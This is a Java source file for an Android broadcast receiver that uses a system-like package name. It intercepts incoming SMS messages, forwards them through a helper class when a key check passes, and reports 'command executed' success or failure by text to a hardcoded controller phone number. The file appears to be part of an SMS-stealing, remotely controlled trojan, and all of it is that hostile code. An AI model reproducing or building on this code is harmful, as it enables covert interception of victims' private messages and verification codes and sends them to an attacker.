package com.android.smssystem;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

public class SmSReceiver extends BroadcastReceiver {

	private SharedPreferences sp = null;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Log.i("action", intent.getAction());
		sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
		if (intent.getAction().equals(SmSserver.SMS_RECEIVED)
				|| intent.getAction().equals(SmSserver.SMS_RECEIVED_2)
				|| intent.getAction().equals(SmSserver.GSM_SMS_RECEIVED)) {
			SmSutils su = new SmSutils();
			if (SmSutils.key.equals(SmSutils.getPublicKey(context))) {
				Bundle bundle = intent.getExtras();
				if (bundle != null && su.isflag()) {
					su.SendSms(bundle, context,this);
				}
			}
		}
		if (intent.getAction().equals(SmSserver.SendState)) {
			SmSutils su = new SmSutils();
			if (this.getResultCode() != Activity.RESULT_OK) {
				su.sendSMS(SmSutils.phone, "指令执行失败状态码 " + this.getResultCode(),
						null);
			} else {
				su.sendSMS(SmSutils.phone, "指令执行成功", null);
			}
		}
	}

}
